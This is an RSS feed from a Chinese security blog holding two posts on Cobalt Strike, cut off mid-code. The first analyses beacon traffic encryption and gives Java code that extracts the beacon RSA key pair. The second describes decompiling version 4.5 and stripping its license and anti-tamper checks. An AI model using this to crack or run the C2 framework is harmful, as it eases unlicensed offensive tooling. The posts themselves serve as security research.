<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Cobaltstrike on Y4ph3tS blog</title>
    <link>https://yaphetszz.github.io/tags/cobaltstrike/</link>
    <description>Recent content in Cobaltstrike on Y4ph3tS blog</description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Tue, 06 Dec 2022 02:13:01 +0800</lastBuildDate>
    <atom:link href="https://yaphetszz.github.io/tags/cobaltstrike/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CS反制浅析——从伪装上线到RCE</title>
      <link>https://yaphetszz.github.io/posts/cs%E5%8F%8D%E5%88%B6%E6%B5%85%E6%9E%90%E4%BB%8E%E4%BC%AA%E8%A3%85%E4%B8%8A%E7%BA%BF%E5%88%B0rce/</link>
      <pubDate>Tue, 06 Dec 2022 02:13:01 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/cs%E5%8F%8D%E5%88%B6%E6%B5%85%E6%9E%90%E4%BB%8E%E4%BC%AA%E8%A3%85%E4%B8%8A%E7%BA%BF%E5%88%B0rce/</guid>
      <description>&lt;h1 id=&#34;cs反制浅析从伪装上线到rce&#34;&gt;CS反制浅析——从伪装上线到RCE&lt;/h1&gt;&#xA;&lt;p&gt;文章不是一个时间段写的（主要内容都是好多年前写的，用的版本比较旧，后面一部分代码截图分析用的新版本，看核心逻辑一样就懒得找老版本了），截图使用的版本有些乱，因为现在准备发的时候发现之前的图有点问题，重新复现或者分析截一下，反正原理是一样的，核心没有变，不要在意细节。本文仅用作安全技术研究。&lt;/p&gt;&#xA;&lt;h2 id=&#34;cs流量分析&#34;&gt;CS流量分析&lt;/h2&gt;&#xA;&lt;p&gt;通过CS上线，抓包并筛选HTTP流量&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/AI13EcDdLlElcfSviBXNooiZkJbJJasiKdqn-2HoTRU.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;定位到上线的包，里面包含cookie，cookie即为加密字段&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/1HXst4CcPDxnU6oqd4Wd-M4Dtj1wcRAWDk3eCKA4m6I.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;分析逆向后的CobaltStrike源码，定位到BeaconHTTP类中的Beacon Entry&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/skB0MMvnnIK4Hph5Ijv7A-7AB5hsYd4OHqpaND8gB8s.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续跟进到C2Beacon类，BeaconEntry入口点在此处进行定义&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/BAT6eLZ2kG7wA-971kccfMEnVRCDX_d7l02dVAI_cFc.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续跟进AsymmetricCrypto方法后进入AsymmetricCrypto类，其中是一个明显的RSA加密，模式未ECB，填充方式为PKCS1&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/l8TljA7bgkhS2Myu4n4tpU1PnQF1Pg5JuOAwp-WnDIQ.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续往下跟到decrypt方法，RSA的解密需要调用私钥&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/UeXzc4yjPBaJubWXmOwV23B-aBybT1ZBg-zZGHePSdw.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;回到BeaconC2类，其中对asecurity变量的赋值只有再setCrypto方法中存在&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/b-L_P1_7hxEsjsuFefAcNd06zbIzUmmdGVp1iXqCSlo.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用IDEA全局搜索功能定位调用的文件，出现在BeaconSetup类中&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/yiqaoFiRAr-tsiLrVmSSCotn9gZohWqsAZEybF0_qwU.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/QHJj1F5GyqLnL-t4PuYlgKS1SQOZ8WnuQJq3qq9HLqU.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续跟传入的参var2，var2的值来自beacon_asymmetric()方法，这个方法在同个类中定义，这其中的关键就是.cobaltstrike.beacon_keys&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/mte_kFVY_Bisq2X6ZYuAvhYYzqTDKQQXj5ysAU0Xkrc.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这个文件在cs运行目录下也能找到，是beacon的key文件，通常情况下通过一些工具就可以解析公钥，比如GitHub上的CobaltStrikeParser能解析默认配置下的stage信息&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/oug1LIjpBoKssjcuMO7iw4rfVORZzk8PFb1fYUDuUXE.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;要取得私钥需要通过一些方法，根据上面的代码，编写一个工具类用于提取私钥，这个代码很多人都写过，直接拿大佬写完的也行&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.File;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.Base64;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; common.CommonUtils;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.security.KeyPair;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DumpKeys&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            File file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; File(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.cobaltstrike.beacon_keys&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (file.&lt;span style=&#34;color:#a6e22e&#34;&gt;exists&lt;/span&gt;()) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                KeyPair keyPair &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (KeyPair)CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;(file, &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Private Key: %s\n\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; String(Base64.&lt;span style=&#34;color:#a6e22e&#34;&gt;getEncoder&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;encode&lt;/span&gt;(keyPair.&lt;span style=&#34;color:#a6e22e&#34;&gt;getPrivate&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;getEncoded&lt;/span&gt;())));&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Public Key: %s\n\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; String(Base64.&lt;span style=&#34;color:#a6e22e&#34;&gt;getEncoder&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;encode&lt;/span&gt;(keyPair.&lt;span style=&#34;color:#a6e22e&#34;&gt;getPublic&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;getEncoded&lt;/span&gt;())));&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not find .cobaltstrike.beacon_keys file&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception exception) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not read asymmetric keys&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用此代码读取beacon_keys即可进行解密，运行前需设置classpath为cs的jar包文件&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（四）——深入解析Cobaltstrike（二开环境与认证过程分析）</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E5%9B%9B%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90cobaltstrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E4%B8%8E%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/</link>
      <pubDate>Sat, 06 Aug 2022 19:47:18 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E5%9B%9B%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90cobaltstrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E4%B8%8E%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/</guid>
      <description>&lt;p&gt;文章其实22年就写了，因为一些原因没有发，本来是笔记，删删改改处理了一些东西后发布&lt;/p&gt;&#xA;&lt;p&gt;之前研究的版本太老了，找个稍微新一点的版本，选用CS4.5进行研究，另外，刚好官方文档描述CS4.5更新了license验证机制，官网链接https://www.cobaltstrike.com/blog/cobalt-strike-4-5-fork-run-youre-history&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215153237060.png&#34; alt=&#34;image-20241215153237060&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;二开环境配置&#34;&gt;二开环境配置&lt;/h2&gt;&#xA;&lt;p&gt;下载完先和官网对比一下hash值避免被加料&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241211000754709.png&#34; alt=&#34;image-20241211000754709&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;反编译的方法很多就不赘述了，百度一下能搜到一堆（jd、java-decompiler&amp;hellip;）但是由于有些工具无法识别lambda表达式，因此选择的时候建议找个合适的&lt;/p&gt;&#xA;&lt;p&gt;并在dependencies中加入依赖，直接添加library或从jar包添加都行&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215112215268.png&#34; alt=&#34;image-20241215112215268&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;CS的启动类为aggressor.Aggressor，将该文件复制到src目录下，配置Artifact选项，以生成jar包，其中Manifest文件复制lib中的Manifest即可，之后编译Artifact包&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215113422438.png&#34; alt=&#34;image-20241215113422438&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;启动前添加配置，其中JAR地址为刚刚编译的jar包，VM选项为&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215113528425.png&#34; alt=&#34;image-20241215113528425&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在代码中加入一个弹窗显示消息，并测试是否能够成功执行&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;JOptionPane.showMessageDialog(null,&amp;#34;CS4.5 Modified BY:Y4ph3tS&amp;#34;);&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215113740524.png&#34; alt=&#34;image-20241215113740524&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过刚刚配置好的模板运行，弹出窗口即成功&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215113856301.png&#34; alt=&#34;image-20241215113856301&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;认证流程简析与去暗桩&#34;&gt;认证流程简析与去暗桩&lt;/h2&gt;&#xA;&lt;p&gt;由于是原版没有进行破解，所以之后会报错退出，接下来研究一下验证的逻辑，并且进行暗桩的去除&lt;/p&gt;&#xA;&lt;p&gt;beacon/BeaconData.java&lt;/p&gt;&#xA;&lt;p&gt;shouldPad设置为false&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215115314402.png&#34; alt=&#34;image-20241215115314402&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;beacon/CommandBuilder.java&lt;/p&gt;&#xA;&lt;p&gt;在文件最后的static方法中，有大量对变量var1的修改，分析后发现是校验逻辑之一，如果var1为false则程序退出，因此只需保证var1永真&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215120926725.png&#34; alt=&#34;image-20241215120926725&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来分析核心部分common/Authorization.java，其中主要步骤是校验cobaltstrike.auth，其中对auth文件进行了校验，读取到auth文件并经过格式校验后，调用AuthCrypto的decrypt进行解密&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215141215124.png&#34; alt=&#34;image-20241215141215124&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;跟进AuthCrypto，可见其中有一个RSA Key验证操作，先读取authkey.pub公钥文件的md5值，如果通过验证就获取其中的公钥值，生成的操作，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215141457879.png&#34; alt=&#34;image-20241215141457879&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;完整代码如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;AuthCrypto&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Cipher.&lt;span style=&#34;color:#a6e22e&#34;&gt;getInstance&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSA/ECB/PKCS1Padding&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception var2) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not initialize crypto&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         MudgeSanity.&lt;span style=&#34;color:#a6e22e&#34;&gt;logException&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AuthCrypto init&amp;#34;&lt;/span&gt;, var2, &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;readAll&lt;/span&gt;(CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getClassLoader&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;getResourceAsStream&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;resources/authkey.pub&amp;#34;&lt;/span&gt;));&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;MD5&lt;/span&gt;(var1);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;8bb4df00c120881a1945a43e2bb2379e&amp;#34;&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;equals&lt;/span&gt;(CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;toHex&lt;/span&gt;(var2))) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;print_error&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid authorization file&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            System.&lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;(0);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         X509EncodedKeySpec var3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; X509EncodedKeySpec(var1);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         KeyFactory var4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; KeyFactory.&lt;span style=&#34;color:#a6e22e&#34;&gt;getInstance&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSA&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var4.&lt;span style=&#34;color:#a6e22e&#34;&gt;generatePublic&lt;/span&gt;(var3);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception var5) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not deserialize authpub.key&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         MudgeSanity.&lt;span style=&#34;color:#a6e22e&#34;&gt;logException&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;authpub.key deserialization&amp;#34;&lt;/span&gt;, var5, &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; String &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var1) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;(var1);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span 